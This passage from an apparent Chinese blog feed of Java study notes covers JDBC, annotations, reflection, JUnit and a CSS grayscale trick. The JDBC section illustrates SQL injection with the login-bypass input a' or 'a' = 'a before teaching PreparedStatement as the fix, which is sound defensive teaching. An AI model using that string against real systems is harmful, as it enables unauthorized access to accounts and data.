password)</li><li>参数：<ul><li>url：指定连接的路径</li><li>语法：jdbc:mysql://ip地址(域名):端口号/数据库名称</li><li>例子：jdbc:mysql://localhost:3306/db3</li><li>细节：如果连接的是本机mysql服务器，并且mysql服务默认端口是3306，则url可以简写为：jdbc:mysql:///数据库名称</li><li>user：用户名</li><li>password：密码</li></ul></li></ul></li></ol></li></ul></li><li>Connection：数据库连接对象<ol><li>功能：<ol><li>获取执行sql 的对象<ul><li>Statement createStatement()</li><li>PreparedStatement prepareStatement(String sql)</li></ul></li><li>管理事务：<ul><li>开启事务：setAutoCommit(boolean autoCommit) ：调用该方法设置参数为false，即开启事务</li><li>提交事务：commit()</li><li>回滚事务：rollback()</li></ul></li></ol></li></ol></li><li>Statement：执行sql的对象<ol><li>执行sql<ol><li>boolean execute(String sql) ：可以执行任意的sql 了解</li><li>int executeUpdate(String sql) ：执行DML（insert、update、delete）语句、DDL(create，alter、drop)语句<ul><li>返回值：影响的行数，可以通过这个影响的行数判断DML语句是否执行成功 返回值&gt;0的则执行成功，反之，则失败。</li></ul></li><li>ResultSet executeQuery(String sql) ：执行DQL（select)语句</li></ol></li><li>练习：<ol><li><p>account表 添加一条记录</p></li><li><p>account表 修改记录</p></li><li><p>account表 删除一条记录</p><p>代码： Statement stmt = null; Connection conn = null; try { //1. 注册驱动 Class.forName(“com.mysql.jdbc.Driver”); //2. 定义sql String sql = “insert into account values(null,’王五’,3000)”; //3.获取Connection对象 conn = DriverManager.getConnection(“jdbc:mysql:///db3”, “root”, “root”); //4.获取执行sql的对象 Statement stmt = conn.createStatement(); //5.执行sql int count = stmt.executeUpdate(sql);//影响的行数 //6.处理结果 System.out.println(count); if(count &gt; 0){ System.out.println(“添加成功！”); }else{ System.out.println(“添加失败！”); }</p><pre><code class="hljs less">&#125; <span class="hljs-selector-tag">catch</span> (ClassNotFoundException e) &#123;    <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();&#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;    <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();&#125;<span class="hljs-selector-tag">finally</span> &#123;    <span class="hljs-comment">//stmt.close();</span>    <span class="hljs-comment">//7. 释放资源</span>    <span class="hljs-comment">//避免空指针异常</span>    <span class="hljs-selector-tag">if</span>(stmt != null)&#123;        <span class="hljs-selector-tag">try</span> &#123;            <span class="hljs-selector-tag">stmt</span><span class="hljs-selector-class">.close</span>();        &#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;            <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();        &#125;    &#125;                <span class="hljs-selector-tag">if</span>(conn != null)&#123;        <span class="hljs-selector-tag">try</span> &#123;            <span class="hljs-selector-tag">conn</span><span class="hljs-selector-class">.close</span>();        &#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;            <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();        &#125;    &#125;&#125;</code></pre></li></ol></li></ol></li><li>ResultSet：结果集对象,封装查询结果<ul><li>boolean next(): 游标向下移动一行，判断当前行是否是最后一行末尾(是否有数据)，如果是，则返回false，如果不是则返回true</li><li>getXxx(参数):获取数据<ul><li>Xxx：代表数据类型 如： int getInt() , String getString()</li><li>参数：<ol><li>int：代表列的编号,从1开始 如： getString(1)</li><li>String：代表列名称。 如： getDouble(“balance”)</li></ol></li></ul></li><li>注意：<ul><li>使用步骤：<ol><li>游标向下移动一行</li><li>判断是否有数据</li><li>获取数据 //循环判断游标是否是最后一行末尾。 while(rs.next()){ //获取数据 //6.2 获取数据 int id = rs.getInt(1); String name = rs.getString(“name”); double balance = rs.getDouble(3); <pre><code class="hljs pgsql"><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(id + &quot;---&quot; + <span class="hljs-type">name</span> + &quot;---&quot; + balance);</code></pre> }</li></ol></li></ul></li><li>练习：<ul><li>定义一个方法，查询emp表的数据将其封装为对象，然后装载集合，返回。<ol><li>定义Emp类</li><li>定义方法 public List findAll(){}</li><li>实现方法 select * from emp;</li></ol></li></ul></li></ul></li><li>PreparedStatement：执行sql的对象<ol><li>SQL注入问题：在拼接sql时，有一些sql的特殊关键字参与字符串的拼接。会造成安全性问题<ol><li>输入用户随便，输入密码：a’ or ‘a’ = ‘a</li><li>sql：select * from user where username = ‘fhdsjkf’ and password = ‘a’ or ‘a’ = ‘a’</li></ol></li><li>解决sql注入问题：使用PreparedStatement对象来解决</li><li>预编译的SQL：参数使用?作为占位符</li><li>步骤：<ol><li>导入驱动jar包 mysql-connector-java-5.1.37-bin.jar</li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql<ul><li>注意：sql的参数使用？作为占位符。 如：select * from user where username = ? and password = ?;</li></ul></li><li>获取执行sql语句的对象 PreparedStatement Connection.prepareStatement(String sql)</li><li>给？赋值：<ul><li>方法： setXxx(参数1,参数2)<ul><li>参数1：？的位置编号 从1 开始</li><li>参数2：？的值</li></ul></li></ul></li><li>执行sql，接受返回结果，不需要传递sql语句</li><li>处理结果</li><li>释放资源</li></ol></li><li>注意：后期都会使用PreparedStatement来完成增删改查的所有操作<ol><li>可以防止SQL注入</li><li>效率更高</li></ol></li></ol></li></ol></li></ol><h2 id="抽取JDBC工具类-：-JDBCUtils"><a href="#抽取JDBC工具类-：-JDBCUtils" class="headerlink" title="抽取JDBC工具类 ： JDBCUtils"></a>抽取JDBC工具类 ： JDBCUtils</h2><ul><li>目的：简化书写</li><li>分析：<ol><li>注册驱动也抽取</li><li>抽取一个方法获取连接对象<ul><li>需求：不想传递参数（麻烦），还得保证工具类的通用性。</li><li>解决：配置文件 jdbc.properties url= user= password=</li></ul></li><li>抽取一个方法释放资源</li></ol></li><li>代码实现： public class JDBCUtils { private static String url; private static String user; private static String password; private static String driver; /**<ul><li><p>文件的读取，只需要读取一次即可拿到这些值。使用静态代码块 */ static{ //读取资源文件，获取值。</p>  <pre><code class="hljs reasonml"><span class="hljs-keyword">try</span> &#123;    <span class="hljs-comment">//1. 创建Properties集合类。</span>    Properties pro = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Properties()</span>;    <span class="hljs-comment">//获取src路径下的文件的方式---&gt;ClassLoader 类加载器</span>    ClassLoader classLoader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDBCUtils</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">ClassLoader()</span>;    URL res  = classLoader.get<span class="hljs-constructor">Resource(<span class="hljs-string">&quot;jdbc.properties&quot;</span>)</span>;    String path = res.get<span class="hljs-constructor">Path()</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(path);<span class="hljs-comment">///D:/IdeaProjects/itcast/out/production/day04_jdbc/jdbc.properties</span>    <span class="hljs-comment">//2. 加载文件</span>   <span class="hljs-comment">// pro.load(new FileReader(&quot;D:\\IdeaProjects\\itcast\\day04_jdbc\\src\\jdbc.properties&quot;));</span>    pro.load(<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileReader(<span class="hljs-params">path</span>)</span>);    <span class="hljs-comment">//3. 获取数据，赋值</span>    url = pro.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;url&quot;</span>)</span>;    user = pro.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;user&quot;</span>)</span>;    password = pro.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;password&quot;</span>)</span>;    driver = pro.get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;driver&quot;</span>)</span>;    <span class="hljs-comment">//4. 注册驱动</span>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">driver</span>)</span>;&#125; catch (IOException e) &#123;    e.print<span class="hljs-constructor">StackTrace()</span>;&#125; catch (ClassNotFoundException e) &#123;    e.print<span class="hljs-constructor">StackTrace()</span>;&#125;</code></pre><p>  }</p><p>  /**</p></li><li><p>获取连接</p></li><li><p>@return 连接对象 */ public static Connection getConnection() throws SQLException {</p>  <pre><code class="hljs reasonml">return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DriverManager</span>.</span></span>get<span class="hljs-constructor">Connection(<span class="hljs-params">url</span>, <span class="hljs-params">user</span>, <span class="hljs-params">password</span>)</span>;</code></pre><p>  }</p><p>  /**</p></li><li><p>释放资源</p></li><li><p>@param stmt</p></li><li><p>@param conn */ public static void close(Statement stmt,Connection conn){ if( stmt != null){ try { stmt.close(); } catch (SQLException e) { e.printStackTrace(); } }</p>  <pre><code class="hljs less"><span class="hljs-selector-tag">if</span>( conn != null)&#123;    <span class="hljs-selector-tag">try</span> &#123;        <span class="hljs-selector-tag">conn</span><span class="hljs-selector-class">.close</span>();    &#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;        <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();    &#125;&#125;</code></pre><p>  }</p><p>  /**</p></li><li><p>释放资源</p></li><li><p>@param stmt</p></li><li><p>@param conn */ public static void close(ResultSet rs,Statement stmt, Connection conn){ if( rs != null){ try { rs.close(); } catch (SQLException e) { e.printStackTrace(); } }</p>  <pre><code class="hljs less"><span class="hljs-selector-tag">if</span>( stmt != null)&#123;    <span class="hljs-selector-tag">try</span> &#123;        <span class="hljs-selector-tag">stmt</span><span class="hljs-selector-class">.close</span>();    &#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;        <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();    &#125;&#125;<span class="hljs-selector-tag">if</span>( conn != null)&#123;    <span class="hljs-selector-tag">try</span> &#123;        <span class="hljs-selector-tag">conn</span><span class="hljs-selector-class">.close</span>();    &#125; <span class="hljs-selector-tag">catch</span> (SQLException e) &#123;        <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.printStackTrace</span>();    &#125;&#125;</code></pre><p>  }</p><p>}</p></li></ul></li></ul><h2 id="JDBC控制事务："><a href="#JDBC控制事务：" class="headerlink" title="JDBC控制事务："></a>JDBC控制事务：</h2><ol><li>事务：一个包含多个步骤的业务操作。如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败。</li><li>操作：<ol><li>开启事务</li><li>提交事务</li><li>回滚事务</li></ol></li><li>使用Connection对象来管理事务<ul><li>开启事务：setAutoCommit(boolean autoCommit) ：调用该方法设置参数为false，即开启事务<ul><li>在执行sql之前开启事务</li></ul></li><li>提交事务：commit()<ul><li>当所有sql都执行完提交事务</li></ul></li><li>回滚事务：rollback()<ul><li>在catch中回滚事务</li></ul></li></ul></li><li>代码： public class JDBCDemo10 { <pre><code class="hljs reasonml">    public static void main(String<span class="hljs-literal">[]</span> args) &#123;        Connection conn = null;        PreparedStatement pstmt1 = null;        PreparedStatement pstmt2 = null;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">//1.获取连接</span>            conn = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDBCUtils</span>.</span></span>get<span class="hljs-constructor">Connection()</span>;            <span class="hljs-comment">//开启事务</span>            conn.set<span class="hljs-constructor">AutoCommit(<span class="hljs-params">false</span>)</span>;            <span class="hljs-comment">//2.定义sql</span>            <span class="hljs-comment">//2.1 张三 - 500</span>            String sql1 = <span class="hljs-string">&quot;update account set balance = balance - ? where id = ?&quot;</span>;            <span class="hljs-comment">//2.2 李四 + 500</span>            String sql2 = <span class="hljs-string">&quot;update account set balance = balance + ? where id = ?&quot;</span>;            <span class="hljs-comment">//3.获取执行sql对象</span>            pstmt1 = conn.prepare<span class="hljs-constructor">Statement(<span class="hljs-params">sql1</span>)</span>;            pstmt2 = conn.prepare<span class="hljs-constructor">Statement(<span class="hljs-params">sql2</span>)</span>;            <span class="hljs-comment">//4. 设置参数</span>            pstmt1.set<span class="hljs-constructor">Double(1,500)</span>;            pstmt1.set<span class="hljs-constructor">Int(2,1)</span>;            pstmt2.set<span class="hljs-constructor">Double(1,500)</span>;            pstmt2.set<span class="hljs-constructor">Int(2,2)</span>;            <span class="hljs-comment">//5.执行sql</span>            pstmt1.execute<span class="hljs-constructor">Update()</span>;            <span class="hljs-comment">// 手动制造异常</span>            <span class="hljs-built_in">int</span> i = <span class="hljs-number">3</span>/<span class="hljs-number">0</span>;            pstmt2.execute<span class="hljs-constructor">Update()</span>;            <span class="hljs-comment">//提交事务</span>            conn.commit<span class="hljs-literal">()</span>;        &#125; catch (Exception e) &#123;            <span class="hljs-comment">//事务回滚</span>            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-keyword">if</span>(conn != null) &#123;                    conn.rollback<span class="hljs-literal">()</span>;                &#125;            &#125; catch (SQLException e1) &#123;                e1.print<span class="hljs-constructor">StackTrace()</span>;            &#125;            e.print<span class="hljs-constructor">StackTrace()</span>;        &#125;finally &#123;            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDBCUtils</span>.</span></span>close(pstmt1,conn);            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JDBCUtils</span>.</span></span>close(pstmt2,null);        &#125;    &#125;&#125;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>注解</title>
    <link href="/2020/04/14/%E6%B3%A8%E8%A7%A3/index/"/>
    <url>/2020/04/14/%E6%B3%A8%E8%A7%A3/index/</url>
    
    <content type="html"><![CDATA[<p>*<em><em>## 注解：</em> ** _\</em> 概念：说明程序的。给计算机看的<br> * 注释：用文字描述程序的。给程序员看的</p><p> * 定义：注解（Annotation），也叫元数据。一种代码级别的说明。它是JDK1.5及以后版本引入的一个特性，与类、接口、枚举是在同一个层次。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明，注释。<br> * 概念描述：<br> * JDK1.5之后的新特性<br> * 说明程序的<br> * 使用注解：@注解名称</p><p> * 作用分类：<br> ①编写文档：通过代码里标识的注解生成文档【生成文档doc文档】<br> ②代码分析：通过代码里标识的注解对代码进行分析【使用反射】<br> ③编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】</p><p> * JDK中预定义的一些注解<br> * @Override ：检测被该注解标注的方法是否是继承自父类(接口)的<br> * @Deprecated：该注解标注的内容，表示已过时<br> * @SuppressWarnings：压制警告<br> * 一般传递参数all @SuppressWarnings(“all”)</p><p> * 自定义注解<br> * 格式：<br> 元注解<br> public @interface 注解名称{<br> 属性列表;<br> }</p><p> * 本质：注解本质上就是一个接口，该接口默认继承Annotation接口<br> * public interface MyAnno extends java.lang.annotation.Annotation {}</p><p> * 属性：接口中的抽象方法<br> * 要求：</p><ol><li><p>属性的返回值类型有下列取值<br>* 基本数据类型<br>* String<br>* 枚举<br>* 注解<br>* 以上类型的数组</p></li><li><p>定义了属性，在使用时需要给属性赋值</p></li><li><p>如果定义属性时，使用default关键字给属性默认初始化值，则使用注解时，可以不进行属性的赋值。</p></li><li><p>如果只有一个属性需要赋值，并且属性的名称是value，则value可以省略，直接定义值即可。</p></li><li><p>数组赋值时，值使用{}包裹。如果数组中只有一个值，则{}可以省略</p><p>* 元注解：用于描述注解的注解<br>* @Target：描述注解能够作用的位置<br>* ElementType取值：<br>* TYPE：可以作用于类上<br>* METHOD：可以作用于方法上<br>* FIELD：可以作用于成员变量上<br>* @Retention：描述注解被保留的阶段<br>* @Retention(RetentionPolicy.RUNTIME)：当前被描述的注解，会保留到class字节码文件中，并被JVM读取到<br>* @Documented：描述注解是否被抽取到api文档中<br>* @Inherited：描述注解是否被子类继承</p><p>* 在程序使用(解析)注解：获取注解中定义的属性值</p></li><li><p>获取注解定义的位置的对象 （Class，Method,Field）</p></li><li><p>获取指定的注解<br>* getAnnotation(Class)<br>//其实就是在内存中生成了一个该注解接口的子类实现对象</p><p>public class ProImpl implements Pro{<br>public String className(){<br>return “cn.itcast.annotation.Demo1”;<br>}<br>public String methodName(){<br>return “show”;<br>}<br>}</p></li><li><p>调用注解中的抽象方法获取配置的属性值</p><p>* 案例：简单的测试框架<br>* 小结：</p></li><li><p>以后大多数时候，我们会使用注解，而不是自定义注解</p></li><li><p>注解给谁用？</p></li><li><p>编译器</p></li><li><p>给解析程序用</p></li><li><p>注解不是程序的一部分，可以理解为注解就是一个标签_</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>注解</title>
    <link href="/2020/04/13/%E6%B3%A8%E8%A7%A3-2/index/"/>
    <url>/2020/04/13/%E6%B3%A8%E8%A7%A3-2/index/</url>
    
    <content type="html"><![CDATA[<h2 id="注解："><a href="#注解：" class="headerlink" title="注解："></a>注解：</h2><ul><li>概念：说明程序的。给计算机看的</li><li>注释：用文字描述程序的。给程序员看的</li><li>定义：注解（Annotation），也叫元数据。一种代码级别的说明。它是JDK1.5及以后版本引入的一个特性，与类、接口、枚举是在同一个层次。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明，注释。</li><li>概念描述：<ul><li>JDK1.5之后的新特性</li><li>说明程序的</li><li>使用注解：@注解名称</li></ul></li><li>作用分类： ①编写文档：通过代码里标识的注解生成文档【生成文档doc文档】 ②代码分析：通过代码里标识的注解对代码进行分析【使用反射】 ③编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】</li><li>JDK中预定义的一些注解<ul><li>@Override ：检测被该注解标注的方法是否是继承自父类(接口)的</li><li>@Deprecated：该注解标注的内容，表示已过时</li><li>@SuppressWarnings：压制警告<ul><li>一般传递参数all @SuppressWarnings(“all”)</li></ul></li></ul></li><li>自定义注解<ul><li>格式： 元注解  <pre><code class="hljs haxe">       <span class="hljs-keyword">public</span> @<span class="hljs-class"><span class="hljs-keyword">interface</span> 注解名称</span>&#123;属性列表; &#125;</code></pre></li><li>本质：注解本质上就是一个接口，该接口默认继承Annotation接口<ul><li>public interface MyAnno extends java.lang.annotation.Annotation {}</li></ul></li><li>属性：接口中的抽象方法<ul><li>要求：<ol><li>属性的返回值类型有下列取值<ul><li>基本数据类型</li><li>String</li><li>枚举</li><li>注解</li><li>以上类型的数组</li></ul></li><li>定义了属性，在使用时需要给属性赋值<ol><li>如果定义属性时，使用default关键字给属性默认初始化值，则使用注解时，可以不进行属性的赋值。</li><li>如果只有一个属性需要赋值，并且属性的名称是value，则value可以省略，直接定义值即可。</li><li>数组赋值时，值使用{}包裹。如果数组中只有一个值，则{}可以省略</li></ol></li></ol></li></ul></li><li>元注解：用于描述注解的注解<ul><li>@Target：描述注解能够作用的位置<ul><li>ElementType取值：<ul><li>TYPE：可以作用于类上</li><li>METHOD：可以作用于方法上</li><li>FIELD：可以作用于成员变量上</li></ul></li></ul></li><li>@Retention：描述注解被保留的阶段<ul><li>@Retention(RetentionPolicy.RUNTIME)：当前被描述的注解，会保留到class字节码文件中，并被JVM读取到</li></ul></li><li>@Documented：描述注解是否被抽取到api文档中</li><li>@Inherited：描述注解是否被子类继承</li></ul></li></ul></li><li>在程序使用(解析)注解：获取注解中定义的属性值<ol><li>获取注解定义的位置的对象 （Class，Method,Field）</li><li>获取指定的注解<ul><li>getAnnotation(Class) //其实就是在内存中生成了一个该注解接口的子类实现对象  <pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">Pro</span></span>&#123;  <span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">className</span>(<span class="hljs-params"></span>)</span>&#123;       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;cn.itcast.annotation.Demo1&quot;</span>;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">methodName</span>(<span class="hljs-params"></span>)</span>&#123;       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;show&quot;</span>;  &#125;  &#125;</code></pre></li></ul></li><li>调用注解中的抽象方法获取配置的属性值</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>反射</title>
    <link href="/2020/04/12/%E5%8F%8D%E5%B0%84/index/"/>
    <url>/2020/04/12/%E5%8F%8D%E5%B0%84/index/</url>
    
    <content type="html"><![CDATA[<ul><li>框架：半成品软件。可以在框架的基础上进行软件开发，简化编码</li><li>反射：将类的各个组成部分封装为其他对象，这就是反射机制</li><li>好处：<ol><li>可以在程序运行过程中，操作这些对象。</li><li>可以解耦，提高程序的可扩展性。</li></ol></li><li>获取Class对象的方式：<ol><li>Class.forName(“全类名”)：将字节码文件加载进内存，返回Class对象<ul><li>多用于配置文件，将类名定义在配置文件中。读取文件，加载类</li></ul></li><li>类名.class：通过类名的属性class获取<ul><li>多用于参数的传递</li></ul></li><li>对象.getClass()：getClass()方法在Object类中定义着。<ul><li>多用于对象的获取字节码的方式</li></ul></li></ol></li><li>结论：同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个。</li><li>Class对象功能：<ul><li>获取功能：<ol><li>获取成员变量们<ul><li>Field[] getFields() ：获取所有public修饰的成员变量</li><li>Field getField(String name) 获取指定名称的 public修饰的成员变量</li><li>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</li><li>Field getDeclaredField(String name)</li></ul></li><li>获取构造方法们<ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(类… parameterTypes)</li><li>Constructor getDeclaredConstructor(类… parameterTypes)</li><li>Constructor[] getDeclaredConstructors()</li></ul></li><li>获取成员方法们：<ul><li>Method[] getMethods()</li><li>Method getMethod(String name, 类… parameterTypes)</li><li>Method[] getDeclaredMethods()</li><li>Method getDeclaredMethod(String name, 类… parameterTypes)</li></ul></li><li>获取全类名<ul><li>String getName()</li></ul></li></ol></li></ul></li><li>Field：成员变量<ul><li>操作：<ol><li>设置值<ul><li>void set(Object obj, Object value)</li></ul></li><li>获取值<ul><li>get(Object obj)</li></ul></li><li>忽略访问权限修饰符的安全检查<ul><li>setAccessible(true):暴力反射</li></ul></li></ol></li></ul></li><li>Constructor:构造方法<ul><li>创建对象：<ul><li>T newInstance(Object… initargs)</li><li>如果使用空参数构造方法创建对象，操作可以简化：Class对象的newInstance方法</li></ul></li></ul></li><li>Method：方法对象<ul><li>执行方法：<ul><li>Object invoke(Object obj, Object… args)</li></ul></li><li>获取方法名称：<ul><li>String getName:获取方法名</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>反射</title>
    <link href="/2020/04/11/%E5%8F%8D%E5%B0%84-2/index/"/>
    <url>/2020/04/11/%E5%8F%8D%E5%B0%84-2/index/</url>
    
    <content type="html"><![CDATA[<h2 id="反射：框架设计的灵魂"><a href="#反射：框架设计的灵魂" class="headerlink" title="反射：框架设计的灵魂"></a>反射：框架设计的灵魂</h2><ul><li>框架：半成品软件。可以在框架的基础上进行软件开发，简化编码</li><li>反射：将类的各个组成部分封装为其他对象，这就是反射机制</li><li>好处：<ol><li>可以在程序运行过程中，操作这些对象。</li><li>可以解耦，提高程序的可扩展性。</li></ol></li><li>获取Class对象的方式：<ol><li>Class.forName(“全类名”)：将字节码文件加载进内存，返回Class对象<ul><li>多用于配置文件，将类名定义在配置文件中。读取文件，加载类</li></ul></li><li>类名.class：通过类名的属性class获取<ul><li>多用于参数的传递</li></ul></li><li>对象.getClass()：getClass()方法在Object类中定义着。<ul><li>多用于对象的获取字节码的方式</li></ul></li></ol></li><li>结论：同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个。</li><li>Class对象功能：<ul><li>获取功能：<ol><li>获取成员变量们<ul><li>Field[] getFields() ：获取所有public修饰的成员变量</li><li>Field getField(String name) 获取指定名称的 public修饰的成员变量</li><li>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</li><li>Field getDeclaredField(String name)</li></ul></li><li>获取构造方法们<ul><li>Constructor&lt;?&gt;[] getConstructors()</li><li>Constructor getConstructor(类&lt;?&gt;… parameterTypes)</li><li>Constructor getDeclaredConstructor(类&lt;?&gt;… parameterTypes)</li><li>Constructor&lt;?&gt;[] getDeclaredConstructors()</li></ul></li><li>获取成员方法们：<ul><li>Method[] getMethods()</li><li>Method getMethod(String name, 类&lt;?&gt;… parameterTypes)</li><li>Method[] getDeclaredMethods()</li><li>Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes)</li></ul></li><li>获取全类名<ul><li>String getName()</li></ul></li></ol></li></ul></li><li>Field：成员变量<ul><li>操作：<ol><li>设置值<ul><li>void set(Object obj, Object value)</li></ul></li><li>获取值<ul><li>get(Object obj)</li></ul></li><li>忽略访问权限修饰符的安全检查<ul><li>setAccessible(true):暴力反射</li></ul></li></ol></li></ul></li><li>Constructor:构造方法<ul><li>创建对象：<ul><li>T newInstance(Object… initargs)</li><li>如果使用空参数构造方法创建对象，操作可以简化：Class对象的newInstance方法</li></ul></li></ul></li><li>Method：方法对象<ul><li>执行方法：<ul><li>Object invoke(Object obj, Object… args)</li></ul></li><li>获取方法名称：<ul><li>String getName:获取方法名</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUnit单元测试</title>
    <link href="/2020/04/06/junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/index/"/>
    <url>/2020/04/06/junit%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/index/</url>
    
    <content type="html"><![CDATA[<p>测试分类： 1.黑盒测试：未知代码直接测试 2.白盒测试：已知数据，关注程序具体流程，需要写代码 JUnit 使用： <em>步骤： 1.定义一个测试类（测试用例）</em> 建议： <em>测试类名：被测试的类名Test</em> 包名：xxx.xxx.xx.test</p><pre><code class="hljs stata">2.定义测试方法：可独立运行<span class="hljs-comment">     *建议：</span><span class="hljs-comment">        *方法：test测试的方法名</span><span class="hljs-comment">        *返回值：void</span><span class="hljs-comment">        *参数列表：空参</span>3.给方法加@<span class="hljs-keyword">Test</span>（没有main方法无法独立运行，加了注解以后就可独立运行）4.导入JUnit依赖</code></pre><p><em>判定结果：红色代表失败，绿色代表成功，一般会使用断言操作来处理结果</em> Assert.assertEquals（期望的结果，运算的结果）；</p><pre><code class="hljs less">*<span class="hljs-variable">@Before</span>：修饰的方法会在测试方法之前被自动执行*<span class="hljs-variable">@After</span>：修饰的方法会在测试方法执行后执行 ***注意：无论测试方法是否执行成功，<span class="hljs-variable">@Before</span>与<span class="hljs-variable">@After</span>修饰的方法都会顺利执行</code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网站全灰色的办法</title>
    <link href="/2020/04/05/%E7%BD%91%E7%AB%99%E5%85%A8%E7%81%B0%E8%89%B2%E7%9A%84%E5%8A%9E%E6%B3%95/index/"/>
    <url>/2020/04/05/%E7%BD%91%E7%AB%99%E5%85%A8%E7%81%B0%E8%89%B2%E7%9A%84%E5%8A%9E%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>加滤镜：</p><pre><code class="hljs css"><span class="hljs-selector-tag">html</span>&#123;      <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>); -webkit-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);    -moz-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);    -ms-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>); -o-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);    <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;data:image/svg+xml;utf8,#grayscale&quot;</span>);    <span class="hljs-attribute">filter</span>:progid:DXImageTransform.Microsoft.<span class="hljs-built_in">BasicImage</span>(grayscale=<span class="hljs-number">1</span>);    -webkit-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">1</span>);&#125;</code></pre><p>将上述代码粘贴至任意一全局style</p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库三范式</title>
    <link href="/2020/03/30/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%89%E8%8C%83%E5%BC%8F/index/"/>
    <url>/2020/03/30/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%89%E8%8C%83%E5%BC%8F/index/</url>
    
